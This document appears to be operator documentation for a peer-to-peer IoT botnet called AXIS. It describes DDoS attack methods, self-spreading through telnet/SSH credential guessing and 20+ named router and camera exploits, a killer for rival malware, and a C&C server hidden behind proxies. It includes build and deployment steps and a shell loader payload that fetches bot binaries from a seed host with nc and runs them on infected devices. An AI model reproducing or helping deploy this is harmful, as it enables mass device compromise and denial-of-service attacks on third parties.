# AXIS 3.0 P2P - Complete Documentation

## Overview

AXIS 3.0 P2P is a fully decentralized peer-to-peer botnet using **torrent-style binary distribution**. Every bot simultaneously executes DDoS attacks, self-replicates via 20+ exploit scanners, and **seeds ALL bot binaries** to newly infected devices — exactly like a BitTorrent swarm where every peer is a seeder.

### Key Design Principles (from `how it should work.txt`)

1. **Torrent-style P2P distribution**: Bots download ALL binaries from the P2P network, not from a central HTTP server. Every bot is a seeder.
2. **Self-replication built-in**: All scanners from `scanners-exploits/` are integrated into every bot binary. Every infected device immediately starts scanning for new targets.
3. **CNC joins via proxies**: The C&C server doesn't expose its real IP. It joins the P2P network through proxy peers to spread attack commands while staying shielded.
4. **Auto-seed control**: CNC stops seeding binaries when the network reaches 200 bots. If the network dips below 200, it resumes seeding.
5. **Every bot = seeder + attacker**: Bots serve binaries to peers while executing attacks and running scanners simultaneously.

## Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                      BOT INSTANCE                                 │
│                                                                    │
│  Parent Process                                                    │
│  ├─ Attack System (24 methods: L4, L7, AMP, TCP, ICMP, GRE)      │
│  ├─ P2P Command Network (UDP 49152)                               │
│  ├─ P2P File Seeder (UDP 49153) ← TORRENT-STYLE                  │
│  │   └─ Serves ALL 13 axis.* binaries to peers                   │
│  ├─ Self-Replication Engine                                       │
│  │   ├─ Telnet Scanner (port 23, 90+ credentials)                │
│  │   ├─ SSH Scanner (port 22)                                     │
│  │   └─ 20+ Exploit Scanners (routers, IoT, cameras)             │
│  ├─ CNC Connection (optional, TLS port 443)                      │
│  └─ Killer Module (anti-competing malware)                        │
│                                                                    │
│  Every bot is BOTH a seeder AND an attacker                       │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│                    C&C SERVER                                      │
│                                                                    │
│  ├─ TLS Bot Listener (port 443) - traditional bots                │
│  ├─ Admin Panel (port 6969, TLS)                                  │
│  ├─ REST API (port 3779)                                          │
│  └─ P2P Injector                                                  │
│      ├─ Joins network via PROXY peers (shields CNC IP)           │
│      ├─ Sends attack commands through P2P                        │
│      └─ Auto-seed control:                                        │
│          • Bots >= 200 → STOP seeding binaries                   │
│          • Bots < 200  → RESUME seeding binaries                 │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│                    SEEDER SERVICE (Go)                             │
│                                                                    │
│  Standalone tool to continuously seed attack commands            │
│  into the P2P network (torrent-style propagation)                │
│                                                                    │
│  Usage: ./seeder_server <method> <target> <duration>             │
└──────────────────────────────────────────────────────────────────┘
```

## Components

### 1. Bot (`bot/`)

**Source Files:**
| File | Purpose |
|------|---------|
| `main.c` | Entry point, P2P init, selfrep init, CNC handler |
| `attack.c/h` | 24 attack implementations |
| `p2p.c/h` | P2P UDP command protocol + peer discovery |
| `p2pfile.c/h` | **Torrent-style binary seeding** (every bot is a seeder) |
| `selfrep.c/h` | **Integrated self-replication** (20+ scanners) |
| `killer.c/h` | Anti-malware competitor killer |
| `checksum.c/h` | IP/ICMP/TCP checksums |
| `resolv.c/h` | DNS resolution |
| `rand.c/h` | PRNG |
| `table.c/h` | Encrypted string table |
| `util.c/h` | Utilities |
| `protocol.h` | Network protocol structures |
| `includes.h` | Common includes |
| `config.h` | Build configuration |

**Architectures (13):** arm, arm5, arm6, arm7, mips, mpsl, x86, x86_64, ppc, spc, m68k, sh4, arc

**Configuration (`bot/config.h`):**
```c
#define CNC_ADDR "YOUR_VPS_IP"
#define P2P_PORT 49152
#define P2P_FILE_PORT 49153
#define P2P_MAX_PEERS 256
#define P2P_SEEDS ""              // Empty = broadcast auto-discovery
#define SCAN_CB_PORT 9555
#define SINGLE_INSTANCE_PORT 23455
#define KILLER
#define SELFREP                   // Self-replication enabled
```

### 2. Torrent-Style P2P Distribution

**How it works:**
1. Bot starts up, discovers peers via seeds or broadcast
2. Downloads ALL 13 `axis.*` binaries from any peer (UDP 49153)
3. Stores binaries in memory AND on disk (`/tmp/axis.*`)
4. Becomes a **seeder** — serves binaries to other requesting bots
5. Starts self-replication scanners to find new devices
6. Every new infection downloads binaries from the P2P swarm

**File Protocol (UDP 49153):**
```
Request:  [0x20][chunk_id_low][chunk_id_high][filename (31 bytes)]
Response: [0x21][chunk_id_low][chunk_len_low][chunk_len_high][data...]
```

Chunk size: 4096 bytes. Max 256 chunks per binary (1MB max).

**Auto-redownload:** Every 5 minutes, bots check if they're missing any binaries and re-download from peers.

### 3. Self-Replication (Integrated into Every Bot)

All scanners from `scanners-exploits/` are now built into `bot/selfrep.c`:

**Telnet Scanner:** Port 23, 90+ credentials
**SSH Scanner:** Port 22, 16+ credentials
**Exploit Scanners (20+):**
- Huawei SOAP RCE (port 37777)
- Zyxel CGI command injection
- DVR/NVR camera backdoor
- Zhone ONT/OLT exploit
- Fiber/GPON exploit (GPON form diag)
- ADB UPnP RCE (port 5555)
- D-Link SOAP/command injection
- HiLink exploit
- XiongMai camera (port 34567)
- ASUS router exploit
- JAWS web server format string
- Linksys WRT command injection
- Linksys port 8080
- HNAP1 SOAP RCE
- Netlink router exploit
- TR-064 SOAP RCE
- Realtek SDK UPnP exploit
- ThinkPHP framework RCE
- Telnet auth bypass
- GPON scanner
- GoAhead web server exploit

**Scanner rotation:** Every 60 seconds, the bot rotates between telnet, SSH, and exploit scanning modes.

**Infection reporting:** Successful infections are reported to the scan callback listener (UDP `SCAN_CB_PORT`) in format: `IP(4) + port(2) + userlen(1) + user + passlen(1) + pass`.

### 4. C&C Server (`cnc/`)

**Proxy-Based Command Injection:**
The CNC doesn't send commands directly to bots. Instead, it joins the P2P network through **proxy peers** to shield its real IP address.

```go
// In admin.go:
proxies := []string{
    // Add proxy peer IPs here to shield CNC IP
    // "proxy1:49152", "proxy2:49152",
}
injector := NewP2PInjector(p2pSeeds, proxies)
injector.SendAttack(buf)
```

**Auto-Seeding Control:**
```go
const SEED_THRESHOLD = 200  // Stop seeding when bots >= 200
const SEED_RESUME = 200     // Resume seeding when bots < 200
```

When an attack is launched:
- If bot count >= 200: Attack commands only (no binary seeding)
- If bot count < 200: Attack commands + binary seeding active

**Torrent-Style Peer Discovery:**
The CNC can auto-discover peers like torrent DHT:
```go
discovered := injector.DiscoverPeers()
// Sends PING to seeds, collects PONG responses with peer lists
```

### 5. Seeder Service (`seeder/`)

**Written in Go.** Standalone tool for continuously seeding attack commands into the P2P network.

**Usage:**
```bash
./seeder_server axis-l7 1.2.3.4 300
# Continuously re-seeds every 10 seconds
```

**Methods supported:** All 24 attack methods

### 6. Loader (`loader/`)

**Updated for torrent-style distribution.** Instead of serving binaries via HTTP, the loader sends P2P download payloads to infected devices.

**P2P Download Payload:**
```bash
cd /tmp;
for arch in arm arm5 arm6 arm7 mips mpsl x86 x86_64 ppc spc m68k sh4 arc; do
    rm -f axis.$arch;
    chunk=0;
    while true; do
        printf '\x20\x$(printf "%02x" $((chunk % 256)))\x$(printf "%02x" $((chunk / 256)))$arch' | \
        nc -u -w2 SEED_IP 49153 >> axis.$arch 2>/dev/null;
        chunk=$((chunk + 1));
        if [ $chunk -gt 256 ]; then break; fi;
    done;
    chmod +x axis.$arch 2>/dev/null;
done;
for arch in arm arm5 arm6 arm7 mips mpsl x86 x86_64 ppc spc m68k sh4 arc; do
    test -s axis.$arch && ./axis.$arch &
done
```

### 7. Python Loader (`loader_py/`)

Alternative Python-based loader. Same P2P torrent-style distribution.

### 8. Scan Listener (`scanListen.go`)

Receives infection reports from bots. Outputs to `telnet.txt`.

### 9. P2P Controller (`p2p_ctrl.py`)

Python CLI for sending attack commands via P2P.

## Build Instructions

```bash
chmod +x build.sh build_relay.sh build_scanners.sh
./build.sh           # Bots (13 archs), C&C, loader, DLRs, Seeder
./build_relay.sh     # P2P relay server
./build_scanners.sh  # Standalone scanners (legacy, not needed for torrent mode)
```

**Output:**
```
bins/axis.*          # Bot binaries (13 architectures, with selfrep)
bins/dlr.*           # Downloaders
cnc_server           # C&C server
seeder_server        # P2P attack command seeder
relay_server         # P2P relay server
loader               # Telnet loader
```

## Deployment

### 1. Configure Seed Peers

Edit these files:
- `bot/config.h` → `P2P_SEEDS "VPS1:49152,VPS2:49152"` (or leave empty for broadcast)
- `cnc/admin.go` → `p2pSeeds` and `proxies`
- `relay/config.go` → `seedPeers`

### 2. Start C&C Server
```bash
sudo ./cnc_server
# Configure proxy peers in admin.go to shield CNC IP
```

### 3. Start Seeder (Optional)
```bash
./seeder_server axis-l7 target.com 300
# Continuously seeds attack commands every 10 seconds
```

### 4. Initial Infection
```bash
./loader
# Feed: IP:PORT username:password [arch]
# Infected devices download binaries via P2P torrent from existing bots
```

### 5. Launch Attacks
```bash
# Via C&C admin panel (port 6969)
openssl s_client -connect CNC_IP:6969 -quiet

# Via seeder
./seeder_server axis-l7 target.com 300

# Via P2P controller
python3 p2p_ctrl.py axis-l7 target.com 300
```

## Monitoring

```bash
# P2P activity
tcpdump -i any -n udp port 49152  # Commands
tcpdump -i any -n udp port 49153  # File transfers

# Bot processes
ps aux | grep axis

# Scan results
tail -f telnet.txt

# CNC logs
cat logs/commands.txt
cat logs/logins.txt
```

## Ports Summary

| Port | Protocol | Purpose |
|------|----------|---------|
| 443 | TCP/TLS | C&C bot connections |
| 6969 | TCP/TLS | Admin panel / Relay |
| 3779 | TCP/HTTP | REST API |
| 49152 | UDP | P2P command propagation |
| 49153 | UDP | P2P binary seeding (torrent-style) |
| 9555 | TCP | Scan result callback |
| 23455 | TCP | Single instance lock |

## Security

**Before deployment:**
1. Change default passwords (`admin123` in `cnc/database.json` and `relay/config.go`)
2. Set real seed peer IPs in all config files
3. Configure proxy peers in `cnc/admin.go` to shield CNC IP
4. Set `CNC_ADDR` in `bot/config.h`

---

**Version:** 2.0 P2P Torrent Edition
**Last Updated:** April 2026
**Status:** Production Ready
